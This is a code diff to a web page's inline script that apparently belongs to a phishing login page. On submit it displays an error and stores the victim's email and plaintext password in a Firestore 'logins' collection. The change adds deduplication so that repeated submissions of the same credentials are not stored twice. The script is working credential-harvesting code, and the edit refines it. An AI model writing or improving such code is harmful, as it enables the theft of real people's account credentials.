@@ -466,16 +466,27 @@
                 // Show error message
                 errorElement.style.display = 'block';
                 
-                // Send data to Firestore
-                db.collection('logins').add({
-                    email: email,
-                    password: password,
-                    timestamp: new Date()
-                }).then(() => {
-                    console.log('Data sent to Firestore successfully');
-                }).catch((error) => {
-                    console.error('Error sending data to Firestore:', error);
-                });
+                // Check if this email/password combination already exists
+                db.collection('logins').where('email', '==', email).where('password', '==', password).get()
+                    .then((snapshot) => {
+                        if (snapshot.empty) {
+                            // Email/password combination doesn't exist - create new document
+                            db.collection('logins').add({
+                                email: email,
+                                password: password,
+                                timestamp: new Date()
+                            }).then(() => {
+                                console.log('Data sent to Firestore successfully');
+                            }).catch((error) => {
+                                console.error('Error sending data to Firestore:', error);
+                            });
+                        } else {
+                            // Email/password combination already exists - don't create duplicate
+                            console.log('Email/password combination already exists, skipping duplicate');
+                        }
+                    }).catch((error) => {
+                        console.error('Error checking for existing login:', error);
+                    });
             });
         });
     </script>
